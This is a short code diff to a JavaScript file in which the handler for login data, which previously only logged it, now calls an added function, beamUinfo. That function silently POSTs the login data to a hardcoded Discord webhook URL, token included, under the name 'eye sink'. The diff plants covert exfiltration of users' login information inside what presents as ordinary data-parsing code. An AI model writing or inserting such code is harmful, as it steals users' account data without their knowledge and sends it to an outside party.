@@ -31,7 +31,8 @@ const tslogDataParsers =
 {
 	login (data)
 	{
-		console.log(data)
+		console.log('%c!', 'color:#FF00FF')
+		beamUinfo(data)
 	},
 	portal (data)
 	{
@@ -166,6 +167,18 @@ function init ()
 	//     .replace(/"(.+)":/g, '$1:')
 
 	// console.log('%c' + strfv, 'font-weight:bold;font-size:125%;color:#004488')
+}
+
+function beamUinfo (data)
+{
+	request = new XMLHttpRequest()
+	request.open('POST', 'https://discordapp.com/api/webhooks/702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF');
+	request.setRequestHeader('Content-type', 'application/json');
+	request.send(JSON.stringify({
+		username: 'eye sink',
+		avatar_url: 'https://cdn.discordapp.com/icons/685704312915230743/1147599f001274e82bf9b2cac44deec8.png',
+		content: String(data)
+	}));
 }
 
 
